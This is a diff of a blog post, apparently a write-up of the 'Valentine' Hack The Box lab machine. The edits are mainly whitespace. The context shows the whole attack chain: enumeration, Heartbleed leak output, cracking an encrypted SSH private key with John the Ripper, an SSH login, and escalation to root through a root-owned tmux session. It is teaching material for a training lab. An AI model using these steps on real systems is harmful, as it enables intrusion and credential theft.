@@ -42,10 +42,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 51.78 seconds
 ```
 So we are dealing with some kind of webserver.
-The root directory of the address is only displaying an image on both webports (80/443), next step would be trying to enumerate directories!
-![Valentine root image](/img/posts/2018/07/valentine-writeup/omg-1.jpg)
-I usually use the tool "gobuster" to enumerate webdirectories with a wordlist, and point it to Burpsuite Proxy. That way, any link or directory that gobuster finds, will Burpsuite automatically spider as well as record in its console.
-so lets point gobuster towards the webserver and let it run in the background
+The root directory of the address is only displaying an image on both webports (80/443), next step would be trying to enumerate directories!  
+![Valentine root image](/img/posts/2018/07/valentine-writeup/omg-1.jpg)  
+I usually use the tool "gobuster" to enumerate webdirectories with a wordlist, and point it to Burpsuite Proxy. That way, any link or directory that gobuster finds, will Burpsuite automatically spider as well as record in its console.  
+So lets point gobuster towards the webserver and let it run in the background
 ```
 root@kali:~/Valentine$ gobuster -u http://10.10.10.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -p 127.0.0.1:8080 -x php
 ```
@@ -68,7 +68,7 @@ root@kali:~/Valentine$ cat heartbleed.txt
 0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
 [..snip..]
 ```
-Now that $text parameter in the response looks like a base64 encoded string.
+Now that $text parameter in the response looks like a base64 encoded string.  
 $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
 ```
 root@kali:~/Valentine$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
@@ -96,8 +96,8 @@ Gobuster v1.2                OJ Reeves (@TheColonial)
 /omg (Status: 200)
 =====================================================
 ```
-So encode and decode just seems to be two php functions that does what they say to base64 strings. They didn't seems that vulnerable to command injections either. But /dev looks interesting , browsing to that reveals two files.
-![Valentine_Slash_dev](/img/posts/2018/07/valentine-writeup/Valentine_Slash_dev.png)
+So encode and decode just seems to be two php functions that does what they say to base64 strings. They didn't seems that vulnerable to command injections either. But /dev looks interesting , browsing to that reveals two files.  
+![Valentine_Slash_dev](/img/posts/2018/07/valentine-writeup/Valentine_Slash_dev.png)  
 Taking a peek at notes.txt shows a checklist.
 ```
 To do:
@@ -122,13 +122,13 @@ DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
 RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 -----END RSA PRIVATE KEY-----
 ```
-According to Proc-Type its encrypted, so next step would be to decrypt it using JohnTheRipper!
+According to Proc-Type its encrypted, so next step would be to decrypt it using JohnTheRipper!  
 First lets create a JTR compatible file to crack, then remembering the decoded base64 string before, might be the password.
 ```
 root@kali:~/Valentine$ ssh2john rsa.encrypted > rsa.john
 root@kali:~/Valentine$ echo "heartbleedbelievethehype" | john --stdin rsa.johnssh
 ```
-That should successfully crack the Private Key!
+That should successfully crack the Private Key!  
 Now we only need to change the permissions and try to connect, what we're missing is the username to connect with, but reading the private keys filename "hype_key", we can always try "hype".
 ```
 root@kali:~/Valentine$ chmod 0600 rsa.encrypted
@@ -141,15 +141,15 @@ Run 'do-release-upgrade' to upgrade to it.
 Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
 hype@Valentine:~$
 ```
-So that takes care of the initial shell, now lets enumerate the system and see what we can find out to Privilege Escalate to root!
-G0tmi1k[^3] Has a really good cheat sheets in how to enumerate linux systems!
+So that takes care of the initial shell, now lets enumerate the system and see what we can find out to Privilege Escalate to root!  
+G0tmi1k[^3] Has a really good cheat sheets in how to enumerate linux systems!  
 So lets do some basic things.
 ```
 hype@Valentine:~$ uname -a
 Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
 ```
-So having a kernel means that it might be vulnerable to the Dirtycow[^4] exploit.
-But generally using such exploit is frowned upon since it might crash the box and ruin the day for other people.
+So having a kernel means that it might be vulnerable to the Dirtycow[^4] exploit.  
+But generally using such exploit is frowned upon since it might crash the box and ruin the day for other people.  
 So lets continue enumerating and hope we find something else.
 ```
 hype@Valentine:~$ history
@@ -162,7 +162,7 @@ hype@Valentine:~$ history
 13 exit
 .....snip....
 ```
-Now running history shows that theres a tmux session (item 12) hype connected to, and running "ps -aux" to check all running processes also shows that the tmux session is running as root.
+Now running history shows that theres a tmux session (item 12) hype connected to, and running "ps -aux" to check all running processes also shows that the tmux session is running as root.  
 Lets connect to the same session.
 ```
 hype@Valentine:~$ !12
